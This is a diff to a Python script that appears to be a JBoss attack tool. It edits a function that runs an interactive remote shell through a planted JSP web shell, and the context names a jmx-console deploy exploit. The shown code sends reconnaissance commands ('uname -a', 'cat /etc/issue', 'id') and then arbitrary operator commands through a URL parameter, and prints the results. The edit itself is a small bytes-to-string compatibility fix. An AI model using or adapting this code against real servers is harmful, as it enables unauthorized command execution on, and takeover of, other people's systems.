@@ -180,8 +180,8 @@ def shell_http(url, shell_type):
     for cmd in ['uname -a', 'cat /etc/issue', 'id']:
         cmd = urlencode({"ppp": cmd})
         r = pool.request('GET', url+path+cmd, redirect=False, headers=headers)
-        resp += " " + r.data.split(">")[1]
-    print(resp),
+        resp += " " + str(r.data).split(">")[1]
+    print(resp.replace('\\n','\n')),
 
     while 1:
         print(BLUE + "[Type commands or \"exit\" to finish]")
@@ -191,7 +191,7 @@ def shell_http(url, shell_type):
 
         cmd = urlencode({"ppp": cmd})
         r = pool.request('GET', url+path+cmd, redirect=False, headers=headers)
-        resp = r.data
+        resp = str(r.data)
         if r.status == 404:
             print(RED + " * Error contacting the command shell. Try again later...")
             continue
@@ -203,7 +203,7 @@ def shell_http(url, shell_type):
         if stdout.count("An exception occurred processing JSP page") == 1:
             print(RED + " * Error executing command \"%s\". " % cmd.split("=")[1] + ENDC)
         else:
-            print(stdout)
+            print(stdout.replace('\\n','\n'))
 
 
 def exploit_jmx_console_main_deploy(url):
